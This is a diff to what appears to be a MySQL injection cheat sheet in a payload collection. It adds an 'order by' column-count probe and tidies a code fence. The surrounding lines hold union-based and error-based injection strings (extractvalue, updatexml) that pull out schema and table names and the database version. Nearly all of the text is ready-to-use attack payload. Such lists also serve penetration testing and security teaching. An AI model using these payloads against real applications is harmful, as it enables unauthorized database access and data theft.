@@ -1,5 +1,15 @@
 # MYSQL Injection
 
+##Detect columns number
+Using a simple ORDER
+```
+order by 1
+order by 2
+order by 3
+...
+order by XXX
+```
+
 ##MySQL Union Based
 ```
 UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
@@ -24,7 +34,7 @@ AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) F
 ```
 
 ##MYSQL Error Based - Extractvalue function
-``` 
+```
 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
